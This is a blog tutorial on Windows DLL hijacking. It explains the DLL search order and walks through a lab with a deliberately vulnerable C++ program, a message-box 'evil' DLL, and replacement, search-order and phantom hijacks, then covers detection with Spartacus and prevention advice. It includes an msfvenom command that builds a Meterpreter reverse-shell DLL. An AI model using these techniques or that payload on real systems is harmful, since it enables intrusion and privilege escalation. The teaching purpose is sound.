---
title: "DLL Hijacking: A Practical Guide"
author: Asier Núñez
pubDatetime: 2024-12-31T13:22:23.365Z
slug: dll-hijacking
featured: true
draft: false
tags:
  - Windows
  - DLL Hijacking
  - Security
  - Ethical Hacking
  - Privilege Escalation
description: "A practical guide to DLL Hijacking, a technique used to inject malicious code into a process by replacing a legitimate DLL with a malicious one."
---

## Table of contents

---

## Introduction

Dynamic Link Libraries (DLLs) are files that contain code and data that can be used by multiple programs at the same time. They are used to provide functionality that is common to many programs, such as graphics rendering, network communication, and file I/O.

DLL Hijacking is a technique used to inject malicious code into a process by replacing a legitimate DLL with a malicious one. This allows an attacker to execute arbitrary code in the context of the target process, which can be used to steal sensitive information, escalate privileges, or perform other malicious actions.

---

## Windows' DLL loading mechanism

To understand DLL hijacking, it's crucial to examine how Windows loads DLLs when their full paths are not specified. If an application dynamically loads a DLL without a fully qualified path, Windows searches for the DLL using a predefined directory sequence known as `Dynamic-link library search order` [[6](#references)].

### Dynamic-link library search order

#### Packaged Apps

Windows searches for DLLs used by packaged apps in the following order:

1. **DLL redirection:** Using redirection configuration to specify alternative DLL paths.
2. **API sets:** Loading API-set schema-defined libraries.
3. **SxS manifest redirection** (Desktop apps only not UWP): Using Side-by-Side (SxS) manifest redirection.
4. **Loaded-module list**: Checking already loaded modules.
5. **Known DLLs**: Verifying if the DLL is part of the system's list of known DLLs.
6. **Package Dependency Graph**: Scanning dependencies in the app's package manifest.
7. **Executable's Folder**: Searching the folder where the calling process's executable resides.
8. **System folder**: Looking in (%SystemRoot%\system32).

#### Unpackaged Apps

For unpackaged applications, the search order extends further:

1. **DLL Redirection.**
2. **API sets.**
3. **SxS manifest redirection.**
4. **Loaded-module list.**
5. **Known DLLs.**
6. **Package Dependency Graph** (Windows 11, version 21H2, and later)
7. **Application's Load Folder**
8. **System folder**: Use the GetSystemDirectory function to retrieve the path of this folder.
9. **The 16-bit system folder.**
10. **The Windows folder**: Use the GetWindowsDirectory function to get the path of this folder.
11. **The current folder.**
12. **PATH environment variable** Directories.

By default, Windows employs Safe DLL Search Mode, which moves the current folder later in the search order to mitigate risks. Disabling this mode moves the current folder higher in priority (from position 11 to position 8) [[6](#references)].

> To disable safe DLL search mode, please refer [to this guide](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#standard-search-order-for-unpackaged-apps).

---

## Attack Methods

The following are the common attacks related to DLL Hijacking:

1. **DLL Replacement**: Replacing legitimate DLLs with malicious ones in known locations.
2. **DLL Search Order Hijacking**: Exploiting the predefined search order to load malicious DLLs.
3. **Phantom DLL Hijacking**: Leveraging references to non-existent DLLs by creating malicious versions.
4. **DLL Redirection**: Using configuration files or registry settings to redirect legitimate DLL calls to malicious ones.
5. **WinSxS DLL Replacement**: Abusing Side-by-Side assemblies to load malicious DLLs.
6. **Relative Path DLL Hijacking**: Exploiting relative paths used in DLL loading to introduce malicious files.

---

## Hands-on Lab

After explaining what DLL-Hijacking consists of and visiting the different kinds of attacks, I prepared a hands-on lab to get familiarized with the techniques
mentioned.

### Preparing The Lab

In this section we will see how the lab was setup and how we can create our own DLL-Hijacking vulnerable programs.
Following through this section is not necessary to practice with the lab, so feel free to jump to [Exploiting Our Program](#exploiting-our-program)
section - although I encourage you to keep reading as knowing on how things work internally always helps us understand better.

We will create an executable called `DllHijacking.exe` that tries loads two DLLs: `example.dll` and `phantom.dll`. The `example.dll` will be a legitimate DLL that contains a function called `AddFunction`. And in the other hand, `phantom.dll` will be a DLL that does not exist. See the following image for a visual representation of the project structure:

![Project Structure](@assets/images/dll-hijacking/dllh-myproject-schema.png)

#### Setup

Before starting to configure our project, we need to configure our development environment. Windows development requires installing Windows proprietary libraries such as Windows SDK. Installing these libraries can be done via [Visual Studio Installer](https://visualstudio.microsoft.com/) as shown in the following image:

![Visual Studio Installer](@assets/images/dll-hijacking/dllh-visual-studio-setup.png)

> _Note:_ Microsoft has it's own walkthrough [Create and use your own Dynamic Link Library (C++)](https://learn.microsoft.com/en-us/cpp/build/walkthrough-creating-and-using-a-dynamic-link-library-cpp?view=msvc-170) - in this post we will be creating our library using different tools.

Once we have the libraries installed, we will need a code editor - Visual Studio Code in my case - and your preferred way of running CMake.

> _Note:_ If you never used CMake I recommend you use the Visual Studio Code [Extension](https://marketplace.visualstudio.com/items?itemName=ms-vscode.cmake-tools).

CMake is a tool that simplifies the build process for development projects across different platforms. It is used to control the software compilation process using simple platform and compiler independent configuration files. In this case, we will use CMake to generate the Visual Studio project files.

This is the `CMakeLists.txt` file that we will use to configure our project:

```cmake
CMAKE_MINIMUM_REQUIRED(VERSION 3.6)
project(DllHijacking)

add_library(example SHARED src/example.cpp)
add_library(evil SHARED src/evil.cpp)

add_executable(${PROJECT_NAME} src/main.cpp)
```

It generates two `shared` libraries (.dll) and an executable (.exe) that will be used to test the different DLL hijacking attacks.
The first library is the `example.dll` that contains the `AddFunction` function, and the second library is the `evil.dll` that shows a message box when loaded.
As for the executable, it will try to load two libraries: `example.dll` and `phantom.dll`. To make the program vulnerable to DLL hijacking, the path to those libraries will be relative, thus making it possible to exploit the different attacks.

Our main program will look like this:

```cpp
#include <Windows.h>
#include <iostream>

typedef int (*AddFunction)(int, int);

int main(int argc, char const *argv[])
{
    HMODULE hDLL = LoadLibrary("example.dll");        // Vulnerable code to DLL hijacking as it does not specify the full path to the DLL
    HMODULE hPhantomDLL = LoadLibrary("phantom.dll"); // Vulnerable code to Phantom DLL hijacking as phantom.dll does not exist
    if (hDLL != NULL)
    {
        AddFunction Add = (AddFunction)GetProcAddress(hDLL, "Add");
        if (Add != NULL)
        {
            std::cout << "Result: " << Add(3, 4) << std::endl;
        }
        FreeLibrary(hDLL);
    }
    else
    {
        std::cerr << "Failed to load DLL." << std::endl;
    }
    if (hPhantomDLL != NULL)
    {
        std::cout << "Phantom DLL loaded successfully." << std::endl;
        FreeLibrary(hPhantomDLL);
    }
    else
    {
        std::cerr << "Failed to load Phantom DLL." << std::endl;
    }
    return 0;
}

```

For the `example.dll` library, we will create a simple function that adds two numbers:

```cpp
#include <windows.h>

#define DLL_EXPORT __declspec(dllexport)

// Function to add two numbers
extern "C" DLL_EXPORT int Add(int a, int b)
{
    return a + b;
}
```

In this example, our `evil.dll` will show a simple message box when loaded. We could create a more complex payload with the following command, but for the sake of simplicity, we will stick to this.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=1234 LHOTS=eth0 -f dll > evil.dll
```

```cpp
#include <windows.h>

BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        MessageBoxA(NULL, "Evil DLL loaded!", "Evil DLL", MB_OK | MB_ICONINFORMATION);
        break;
    }
    return TRUE;
}
```

---

### Exploiting Our Program

In this section we will see how we can exploit our program with the different techniques mentioned in the [previous section](#attack-methods).

#### What do I need?

You will need to clone the repository and compile the code. You can do this by following the steps below:

1. Clone the repository:

```bash
git clone https://github.com/Asiern/dll-hijacking-lab
```

2. Have Windows SDK installed as shown in [Setup](#setup).

3. Open the project in Visual Studio Code.

4. Install the CMake extension in Visual Studio Code.

5. Configure the project with CMake.

To configure the project with CMake, you need to open the repository in Visual Studio Code and open the command palette by pressing `Ctrl+Shift+P` and typing `CMake: Configure`. This will generate the necessary files to build the project.

6. Build the project.

To build the project, open the command palette again and type `CMake: Build`. This will compile the code and generate the executable and DLLs.

Once you binaries are generated, you will need to place the `example.dll` in the `C:\Windows\System32` directory - using a virtual machine is recommended.

As shown in the following image, the `example.dll` is placed in the `C:\Windows\System32` directory, our `evil.dll` and `DllHijacking.exe` are in the desktop:

![DLLs and Executable](@assets/images/dll-hijacking/dllh-vm-setup.png)

> We can also test if the setup is correct by running the `DllHijacking.exe` executable. If everything is set up correctly, we should see a message in our terminal saying `Result: 7; Failed to load Phantom DLL.` as shown in the previous image.

---

#### DLL Replacement

This is straight the easiest method to leverage a DLL Hijacking attack. The idea behind this attack is to replace the legitimate DLL with a malicious one in a known location where the application will search for it. To pull this off, we need to know the location of the legitimate DLL and have necessary permissions to write into that folder.

In this case, the target dll is placed at `C:\Windows\System32\example.dll`. Writing into this folder requires administrative privileges. We can replace the `example.dll` with a malicious DLL (e.g., `evil.dll`).

> Before overwriting the `example.dll`, make sure you keep a copy as we will need to restore it for the next attacks.

```powershell
copy .\evil.dll C:\Windows\System32\example.dll
```

The previous command will replace the `example.dll` with the `evil.dll`. Now, if we run the `DllHijacking.exe` executable, we should see a message box pop up saying "Evil DLL loaded!" as shown in the following image:

![Evil DLL Loaded](@assets/images/dll-hijacking/dllh-vm-replacement.png)

---

#### DLL Search Order Hijacking

As we saw in the [Dynamic-link library search order](#dynamic-link-library-search-order) section, Windows searches for DLLs in a predefined order. This order can be exploited to load malicious DLLs by placing them in directories that are searched before the legitimate DLLs.

If you followed the previous steps, the `example.dll` is placed in the `C:\Windows\System32` directory. We can exploit this by placing the malicious DLL in the same directory as the executable. This way, the program will load the malicious DLL instead of the legitimate one.

```powershell
copy .\evil.dll .\example.dll
```

The previous command will create a copy of the `evil.dll` and name it `example.dll`. Now, if we run the `DllHijacking.exe` executable, we should see a message box pop up saying "Evil DLL loaded!" as shown in the following image:

![Evil DLL Loaded](@assets/images/dll-hijacking/dllh-vm-search-order.png)

---

#### Phantom DLL Hijacking

Some applications reference DLLs that do not exist. This can be exploited by creating a malicious DLL with the same name as the non-existent DLL and placing it where the program will load it. If the program uses a relative path to load the DLL, we can place the malicious DLL in the same directory as the executable (or any other directory in the search order). Otherwise, we would need to find the path where the program is looking for the DLL and place the malicious DLL there.

So as well as in the previous attack, we can place the `evil.dll` in the same directory as the executable, but this time we will name it `phantom.dll`.

```powershell
copy .\evil.dll .\phantom.dll
```

The previous command will create a copy of the `evil.dll` and name it `phantom.dll`. Now, if we run the `DllHijacking.exe` executable, we should see a message box pop up saying "Evil DLL loaded!" as shown in the following image:

![Evil DLL Loaded](@assets/images/dll-hijacking/dllh-vm-phantom.png)

---

## Detection and Prevention

There are offensive tools like [Spartacus](https://github.com/sadreck/Spartacus), that can be used to detect DLL hijacking vulnerabilities in Windows applications.

### Spartacus

Now let's see how spartacus can be used to detect DLL hijacking vulnerabilities in Windows applications. First, we need to download the latest release from the [GitHub repository](https://github.com/sadreck/Spartacus/releases/latest). Once downloaded, we will need to download `Procmon` from the [official website](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon).

The flow to detect DLL hijacking vulnerabilities is as follows:

1. Start Spartacus.
2. Spartacus will run `Procmon` in the background and start monitoring the system.
3. When a vulnerable application is executed, Spartacus will detect the DLL hijacking vulnerability and save the results to a log file.
4. When we are done testing, we can stop Spartacus and analyze the log file to identify the vulnerable applications.

Now let's put this into practice. We will use Spartacus to detect the DLL hijacking vulnerability in the `DllHijacking.exe` executable. First, we need to start Spartacus with the following command:

```powershell
.\Spartacus.exe --mode dll --procmon ..\ProcessMonitor\Procmon.exe --pml C:\Temp\logs.pml --verbose --csv C:\Temp\VulnerableDLLFiles.csv
```

Let's break down the command:

- `--mode dll`: Specifies that we are looking for DLL hijacking vulnerabilities.
- `--procmon`: Specifies the path to the `Procmon` executable.
- `--pml`: Specifies the path to the log file where the results will be saved.
- `--verbose`: Enables verbose output.
- `--csv`: Specifies the path to the CSV file where the vulnerable DLL files will be saved.

> _Note:_ Make sure to replace the paths with the correct paths on your system and make sure that the Temp directory exists.

Once Spartacus is running we will see the following output:

![Spartacus Running](@assets/images/dll-hijacking/dllh-vm-spartacus.png)

Now Spartacus will be monitoring the system for DLL hijacking vulnerabilities. We can now run the `DllHijacking.exe` executable to trigger the vulnerability. Once we run the executable, Spartacus will detect the vulnerability and save the results to the log file.

After running the executable, we can stop Spartacus by pressing `Enter`. We will see the following output:

![Spartacus Stopped](@assets/images/dll-hijacking/dllh-vm-spartacus-done.png)

In this case, Spartacus detected 6 events that could be potential DLL hijacking vulnerabilities and saved the results to the csv file.

In the following image, we can see the contents of the `VulnerableDLLFiles.csv` file:

![Spartacus Results](@assets/images/dll-hijacking/dllh-vm-spartacus-results.png)

We can observe that our `DllHijacking.exe` executable is vulnerable to DLL hijacking.

---

### Prevention

There are several things to consider when preventing DLL hijacking attacks, as pointed out by Microsoft [[5](#references)]:

- Use fully qualified paths when loading DLLs.
- Remove the CWD from the DLL search path by calling `SetDllDirectory` with an empty string.
- Do not use the SearchPath function to load DLLs.
- Using the [`SetSearchPathMode`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setsearchpathmode?redirectedfrom=MSDN) function to enable safe search mode. This moves the current directory into the last place in the search order.
- Avoid using SearchPath to check for the existence of a DLL before loading it.

The following is an example on how to secure the executable we've been using:

Using a fully qualified path:

```cpp
LoadLibrary("C:\\Windows\\System32\\example.dll");
```

> _Note:_ An attacker could still replace the DLL at the specified path, so it is important to ensure that the DLL is not writable by untrusted users.

When using fully qualified paths is not possible, we can use the `SetDllDirectory` function to remove the current directory from the search path:

```cpp
SetDllDirectory("");
LoadLibrary("example.dll");
```

> _Note:_ This reduces the risk significantly, as the attacker would have to control either the application directory, the Windows directory, or any directories that are specified in the user’s path in order to use a DLL preloading attack.

---

## DLL Proxying

There are cases where the legitimate DLL is required to be loaded by the application. In such cases, we can use DLL proxying to load the legitimate DLL and then load the malicious code. This can be done by creating a proxy DLL that forwards the calls to the legitimate DLL and executes malicious code. This is a more advanced technique that requires knowledge of the functions exported by the legitimate DLL and how to forward the calls to them.

The following image represents how a DLL proxying attack works:

![Dll-Proxying](@assets/images/dll-hijacking/dllh-proxy-schema.png)

In this case, a new DLL called `example.dll` was created (marked in red) that forwards the calls to the legitimate `example.dll` (marked in blue) and contains the malicious code. This way, the application will load the proxy DLL, which will then load the legitimate DLL and execute the malicious code.

We might see a post on DLL Proxying in the future.

> _Note:_ Spartacus also provides a mode to create proxy DLLs.

---

## Conclusion

DLL hijacking is a powerful technique that can be used to inject malicious code into a process by replacing a legitimate DLL with a malicious one. By understanding how Windows loads DLLs and the different attack methods, we can better protect our systems from this type of attack. It is important to be aware of the risks associated with DLL hijacking and take steps to mitigate them, such as using fully qualified paths when loading DLLs and monitoring for suspicious behavior.

I hope this post has given you a better understanding of DLL hijacking and how it can be used to compromise systems. Happy hacking! 🚀

---

## References

1. Pranay Bafna, [_TCAPT: DLL Hijacking_](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e), Medium, 2021.
2. [_Dll Hijacking_](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking), HackTricks.
3. Pavel Tsakalidis, [_Spartacus_](https://github.com/sadreck/Spartacus), GitHub.
4. TylerMSFT, alexbuckgit, john-par, itechedit, tfosmark, mikeblome, nxtn, Mikejo5000, ghogen, Saisang, [_Walkthrough: Create and use your own Dynamic Link Library (C++)_](https://learn.microsoft.com/en-us/cpp/build/walkthrough-creating-and-using-a-dynamic-link-library-cpp?view=msvc-170), Microsoft Learn, 2021.
5. Microsoft, [_Secure loading of libraries to prevent DLL preloading attacks_](https://support.microsoft.com/en-us/topic/secure-loading-of-libraries-to-prevent-dll-preloading-attacks-d41303ec-0748-9211-f317-2edc819682e1), Microsoft Support.
6. stevewhims, tbhaxor, drewbatgit, mcleanbryon, DCtheGeek, ForNeVer, mijacobs, msatranjr, [_Dynamic-link library search order_](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order), Microsoft Learn, 2023.
7. stevewhims, v-kents, DCtheGeek, drewbatgit, mijacobs, msatranjr, [_Dynamic-Link Library Security_](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-security), Microsoft Learn, 2021.

---
